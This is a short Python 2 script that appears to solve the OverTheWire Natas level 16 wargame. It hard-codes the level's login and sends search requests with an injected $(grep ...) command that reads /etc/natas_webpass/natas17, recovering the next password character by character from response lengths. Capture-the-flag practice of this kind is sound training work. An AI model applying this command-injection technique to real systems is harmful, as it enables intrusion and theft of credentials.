#!/usr/bin/python

import os, socket, sys, re, urllib2

#ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
pw = "9HBzt5ljtPAgmaYvNfZ8chZVq50oepsx"
charSet = "0123456789"
#nums = [1,6,20,26,27]
pwLength = 32

passman = urllib2.HTTPPasswordMgr()
passman.add_password("Authentication required","http://natas16.natas.labs.overthewire.org/", "natas16", "3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L")
auth = urllib2.HTTPBasicAuthHandler(passman)
opener = urllib2.build_opener(auth)
urllib2.install_opener(opener)

#use RE for "This user doesn't exist." or "This user exists."
i=0
flag = ""

for i in charSet:
	url = "http://natas16.natas.labs.overthewire.org/?needle=$(grep%209HBzt5ljtPAgmaYvNfZ8chZVq5"+i+"%20/etc/natas_webpass/natas17)&submit=Search"
	page = urllib2.urlopen(url)
	resp = page.read()
	print "9HBzt5ljtPAgmaYvNfZ8chZVq5"+i+": " + str(len(resp))